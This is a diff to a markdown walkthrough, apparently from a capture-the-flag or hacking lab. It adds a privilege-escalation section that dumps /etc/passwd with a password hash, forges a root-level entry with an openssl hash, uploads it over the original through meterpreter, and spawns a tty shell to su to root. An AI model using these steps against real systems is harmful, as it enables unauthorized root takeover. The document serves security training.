@@ -370,8 +370,90 @@ output: `www-data` -> we are in thr LLP
 
 11. go to `/temp`
 
-12. `/bin/sh -i`
+12. `/bin/bash -i`
 
 now you get $ sign showing user
 
 You are successfully in LLP of the computer
+
+## Step 4: Privilege Escalation
+
+[Prerequisite](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)
+
+1. do `cat /etc/passwd`
+
+    ```
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    libuuid:x:100:101::/var/lib/libuuid:
+    syslog:x:101:104::/home/syslog:/bin/false
+    messagebus:x:102:106::/var/run/dbus:/bin/false
+    usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
+    dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+    avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+    kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+    rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
+    saned:x:108:115::/home/saned:/bin/false
+    whoopsie:x:109:116::/nonexistent:/bin/false
+    speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+    avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+    lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
+    colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
+    hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+    pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+    nm-openconnect:x:116:124:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/bin/false
+    sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
+    debian-tor:x:118:125::/var/lib/tor:/bin/false
+    postgres:x:119:127:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+    iodine:x:120:65534::/var/run/iodine:/bin/false
+    thpot:x:121:65534:Honeypot user,,,:/usr/share/thpot:/dev/null
+    statd:x:122:65534::/var/lib/nfs:/bin/false
+    redis:x:123:128:redis server,,,:/var/lib/redis:/bin/false
+    indishell:$6$AunCdsxZ$OBxuMf0a/GqstthT4LEW8RGZxepGL7C3jHMk/IFyhLCTJ/.0fo/9Aa.s134i80zAr1HtdyICiogwDAXzG0NWZ0:1000:1000:indishell,,,:/home/indishell:/bin/bash
+    vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+    mysql:x:124:129:MySQL Server,,,:/nonexistent:/bin/false
+    tomcat7:x:125:130::/usr/share/tomcat7:/bin/false
+    ```
+
+    - Observation : all the passwords are labels `x` meaning password in `/etc/shadow`, excpet indishell user -> so we can change his password
+
+2. go back to meterpreter by `exit` (two times)
+3. download "/etc/passwd" to your VM (for editing) by `download /etc/passwd`
+4. open a new terminal and open the passwd file in nano (terminal name: term 2)
+5. make another new terminal to generate password(terminal name: term 3)
+    - `openssl passwd -1 -salt abc pass123`
+        - this will generate the hash of the "pass123" -> "$1$abc$66P0kBoPMsKgk3H5bxZFv/"
+6. edit the passwd file in term 2
+   "indishell:$6$AunCdsxZ$OBxuMf0a/GqstthT4LEW8RGZxepGL7C3jHMk/IFyhLCTJ/.0fo/9Aa.s134i80zAr1HtdyICiogwDAXzG0NWZ0:1000:1000:indishell,,,:/home/indishell:/bin/bash"
+   ->
+   "indishell:$1$abc$66P0kBoPMsKgk3H5bxZFv/:0:0:indishell,,,:/home/indishell:/bin/bash"
+
+    - NOTE : "1000:1000" changed to "0:0" to match user Id and group Id of root
+
+7. save and exit term 2 and term 3
+8. now in meterpreter -> `upload /home/kali/passwd /etc` ("/home/kali/passwd" -> the path where I edited file in local machine)
+9. now get inside the shell and test if it worked or not
+    - `shell`
+    - `/bin/bash -i`
+    - `su indishell` -> password is "pass123"
+        - error: su: must be run from a terminal
+    - [spawn tty shell via python](https://netsec.ws/?p=337) -> `python -c 'import pty; pty.spawn("/bin/sh")'`
+    - `su indishell` -> password is "pass123"
+  10. congratlations now you are root -> `whoami`
+
